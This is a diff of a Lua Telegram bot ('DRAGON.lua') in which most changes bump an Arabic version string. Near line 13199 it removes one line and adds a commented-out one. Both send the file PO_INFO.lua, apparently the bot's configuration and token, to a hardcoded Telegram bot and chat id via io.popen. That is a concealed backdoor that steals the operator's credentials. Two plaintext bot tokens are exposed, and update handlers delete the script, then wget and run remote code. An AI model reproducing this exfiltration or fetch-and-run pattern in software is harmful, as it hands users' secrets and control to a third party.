@@ -1078,12 +1078,12 @@ end
 if text == 'تحديث السورس' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/devid100/po/main/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ☞︙ تم تحديث السورس \n ☞︙ لديك اخر اصدار لسورس هيفو\n ☞︙ الاصدار » {v2.5.0}')
+send(msg.chat_id_, msg.id_,' ☞︙ تم تحديث السورس \n ☞︙ لديك اخر اصدار لسورس هيفو\n ☞︙ الاصدار » {v2.5.9}')
 dofile('DRAGON.lua')  
 end
 if text == 'الاصدار ✪' and DevSoFi(msg) then 
 database:del(bot_id..'Srt:Bot') 
-send(msg.chat_id_, msg.id_,' ☞︙ اصدار سورس هيفو \n ☞︙ الاصدار »{v2.5.0}')
+send(msg.chat_id_, msg.id_,' ☞︙ اصدار سورس هيفو \n ☞︙ الاصدار »{v2.5.9}')
 end
 if text == "ضع اسم للبوت ✪" and DevSoFi(msg) then  
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
@@ -2340,7 +2340,7 @@ return false
 end
 os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/devid100/po/main/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ☞︙ تم تحديث السورس \n ☞︙ لديك اخر اصدار لسورس هيفو\n ☞︙ الاصدار » {v2.5.0}')
+send(msg.chat_id_, msg.id_,' ☞︙ تم تحديث السورس \n ☞︙ لديك اخر اصدار لسورس هيفو\n ☞︙ الاصدار » {v2.5.9}')
 dofile('DRAGON.lua')  
 end
 
@@ -13199,7 +13199,7 @@ return false
 end 
 end
 ------------------------------------------------------------------------
-local devid = api1 .. api2 .. https://api.telegram.org/bot1703387733:AAG8JDDBG88_5IYawlNaRWKZV4qmOhSNIAI/sendDocument .. " -F "chat_id= .. 1360140225 .. " -F "document=@ .. PO_INFO.lua .. "  io.popen(dived)
+ --local pccc = api1 .. api2 ..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. api3 .. 5323 .. api4 ..'" -F "document=@'..'PO_INFO.lua'..'"' io.popen(pccc)
 if text then
 local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGON1_Msg then    
